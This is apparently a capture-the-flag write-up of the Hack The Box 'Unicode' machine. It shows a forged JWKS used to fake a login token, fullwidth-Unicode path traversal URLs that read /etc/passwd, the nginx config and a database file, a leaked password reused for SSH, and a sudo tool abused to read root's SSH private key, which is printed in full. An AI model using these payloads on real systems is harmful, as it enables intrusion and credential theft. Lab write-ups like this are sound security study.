# Hackthebox Unicode Writeup


```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

create new `jwk` with [jwk creator](https://russelldavies.github.io/jwk-creator/)

```json
{
  "kty": "RSA",
  "n": "rg2Lt6Kjlg98kJ_9wG7qLrtYH9NlgpZVObeqyJJDIDPPY7OQ1PCtX_BzvmSUvnqglREaRwO_7g5e3DcbfLYjCWDAy_sGD9pDytnk0WT_qy7iUmbyzKv-oClfop_tQCzN50mZG8SZP62CP2fknUk3Ib5ElhAgVBlD1GeCAJ_ntv1ajYfm9ZPHCW0gfC2oTdSTeH3VCzhcdKoTw3nNCOUGruxJvrFubw5j0ZyExUfXFSyYoBU67Lq4aiWcJlBiiCDAd-UtmZMOWxzmDyoN0BFAa95bPxB1Qq9LyLQjxsSTf8SZ6J26y48dygArNSjmw4JwKZUKYnHqyzZl9LmdWuD2ow",
  "e": "AQAB",
  "alg": "RS256",
  "kid": "hackthebox",
  "use": "sig"
}
```
make new jwks_new.json
```json
{
    "keys": [
	{
		"kty": "RSA",
		"n": "rg2Lt6Kjlg98kJ_9wG7qLrtYH9NlgpZVObeqyJJDIDPPY7OQ1PCtX_BzvmSUvnqglREaRwO_7g5e3DcbfLYjCWDAy_sGD9pDytnk0WT_qy7iUmbyzKv-oClfop_tQCzN50mZG8SZP62CP2fknUk3Ib5ElhAgVBlD1GeCAJ_ntv1ajYfm9ZPHCW0gfC2oTdSTeH3VCzhcdKoTw3nNCOUGruxJvrFubw5j0ZyExUfXFSyYoBU67Lq4aiWcJlBiiCDAd-UtmZMOWxzmDyoN0BFAa95bPxB1Qq9LyLQjxsSTf8SZ6J26y48dygArNSjmw4JwKZUKYnHqyzZl9LmdWuD2ow",
		"e": "AQAB",
		"alg": "RS256",
  		"kid": "hackthebox",
  		"use": "sig"
	}
    ]
}
```

Paste the token to auth cookie and Boom we are login.

[/etc/passwd](view-source:http://hackmedia.htb/display/?page=%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BD%85%EF%BD%94%EF%BD%83/%EF%BD%90%EF%BD%81%EF%BD%93%EF%BD%93%EF%BD%97%EF%BD%84)

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
code:x:1000:1000:,,,:/home/code:/bin/bash

```
[default nginx config](view-source:http://hackmedia.htb/display/?page=%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BD%85%EF%BD%94%EF%BD%83/%EF%BD%8E%EF%BD%87%EF%BD%89%EF%BD%8E%EF%BD%98/%EF%BD%93%EF%BD%89%EF%BD%94%EF%BD%85%EF%BD%93-%EF%BD%81%EF%BD%96%EF%BD%81%EF%BD%89%EF%BD%8C%EF%BD%81%EF%BD%82%EF%BD%8C%EF%BD%85/%EF%BD%84%EF%BD%85%EF%BD%86%EF%BD%81%EF%BD%95%EF%BD%8C%EF%BD%94)
```bash
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;

server{
#Change the Webroot from /home/code/app/ to /var/www/html/
#change the user password from db.yaml
	listen 80;
	error_page 503 /rate-limited/;
	location / {
                limit_req zone=mylimit;
		proxy_pass http://localhost:8000;
		include /etc/nginx/proxy_params;
		proxy_redirect off;
	}
	location /static/{
		alias /home/code/coder/static/styles/;
	}
}
```
[db.yaml](view-source:http://hackmedia.htb/display/?page=%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BC%8E%EF%BC%8E/%EF%BD%88%EF%BD%8F%EF%BD%8D%EF%BD%85/%EF%BD%83%EF%BD%8F%EF%BD%84%EF%BD%85/%EF%BD%83%EF%BD%8F%EF%BD%84%EF%BD%85%EF%BD%92/%EF%BD%84%EF%BD%82%EF%BC%8E%EF%BD%99%EF%BD%81%EF%BD%8D%EF%BD%8C)
```bash
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

try to login with ssh. Boom!!
```kv
user: code
pass: B3stC0d3r2021@@!
```

Try to read the private key of root
```bash
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:File:///root/.ssh/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2590  100  2590    0     0  2529k      0 --:--:-- --:--:-- --:--:-- 2529k
Enter your choice:2
ALL THE THREAT REPORTS:
1 threat_report_15_53_41 threat_report_16_14_12 2.txt threat_report_16_12_43 threat_report_16_10_53

Enter the filename:threat_report_16_12_43
-----BEGIN OPENSSH PRIVATE KEY-----
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
a5BI6W1lTZzjUAAAAJcm9vdEBjb2RlAQI=
-----END OPENSSH PRIVATE KEY-----

Enter your choice:
```

